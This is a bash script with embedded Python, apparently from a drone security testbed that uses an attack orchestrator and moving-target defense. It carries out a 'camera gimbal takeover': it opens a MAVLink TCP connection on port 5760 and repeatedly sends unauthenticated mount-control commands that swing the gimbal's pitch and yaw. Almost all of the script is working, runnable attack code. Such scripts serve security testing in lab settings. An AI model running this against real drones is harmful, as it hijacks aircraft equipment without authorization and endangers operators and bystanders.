#!/usr/bin/env bash
set -euo pipefail

# Attack: Camera Gimbal Takeover (MAVLink, MTD-aware)
# Target Service: DRONE_MAVLINK_TCP (Default Port 5760)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" ]]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# TARGET_SERVICE가 DRONE_MAVLINK_TCP일 경우 기본 포트는 5760입니다.
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
    DRONE_MAVLINK_TCP)
        TARGET_PORT="${TARGET_PORT:-5760}"
        ;;
    *)
        if [[ -z "${TARGET_PORT:-}" ]]; then
            echo "ERROR: TARGET_PORT is not set for service ${TARGET_SERVICE:-UNKNOWN}." >&2
            exit 1
        fi
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=camera-gimbal-takeover src=Camera-Gimbal-Takeover.md"
log "[BLOCK 1] type=python (Gimbal takeover MAVLink script)"

# python3 스크립트를 인라인으로 실행하며 TARGET_IP:TARGET_PORT 인수를 전달합니다.
# '-u' 옵션을 사용하여 버퍼링 없이 실시간 출력을 보장합니다.
sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" << 'PY'
import os
import sys
import time
from pymavlink import mavutil

# 인수 없으면 환경변수 TARGET_IP:TARGET_PORT 사용 (Fallback/Debug)
if len(sys.argv) <= 1:
    target_ip = os.environ.get("TARGET_IP", "127.0.0.1")
    target_port = os.environ.get("TARGET_PORT", "5760")
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

target_ip, target_port_str = sys.argv[1].split(":", 1)
try:
    target_port = int(target_port_str)
except ValueError:
    print(f"[ERROR] Invalid port: {target_port_str}")
    sys.exit(1)

def connect_drone(ip: str, port: int):
    # MAVLink TCP 연결 시도
    master = mavutil.mavlink_connection(f"tcp:{ip}:{port}")
    master.wait_heartbeat()
    print(f"[INFO] Connected to drone at {ip}:{port}")
    return master

def send_gimbal_command(master, pitch=0.0, roll=0.0, yaw=0.0):
    # MAV_CMD_DO_MOUNT_CONTROL 메시지 전송 (각도: cdeg, 100배)
    master.mav.mount_control_send(
        master.target_system,
        master.target_component,
        int(pitch * 100),
        int(roll * 100),
        int(yaw * 100),
        0,  # MAV_MOUNT_MODE_MAVLINK_TARGETING
    )
    print(f"[>] Sent gimbal control: pitch={pitch}, roll={roll}, yaw={yaw}")

def main(ip: str, port: int):
    print(f"[INFO] Starting MAVLink Gimbal Takeover to {ip}:{port}")
    try:
        master = connect_drone(ip, port)
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")
        sys.exit(1)

    # 주기적으로 짐벌 제어 명령 전송
    try:
        while True:
            send_gimbal_command(master, pitch=-45, yaw=90)
            time.sleep(2)
            send_gimbal_command(master, pitch=0, yaw=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[INFO] Stopping gimbal takeover (Caught Interrupt).")
    except Exception as e:
        print(f"[ERROR] Attack loop error: {e}")
        
if __name__ == "__main__":
    main(target_ip, target_port)
PY

log "[BLOCK 2] type=control (In-Foreground Execution)"
# Orchestrator는 이 스크립트를 실행하고, Python 인라인 블록이 포그라운드에서 동작하며 공격을 수행합니다.
# Orchestrator의 SIGTERM 또는 timeout에 의해 공격 프로세스가 종료됩니다.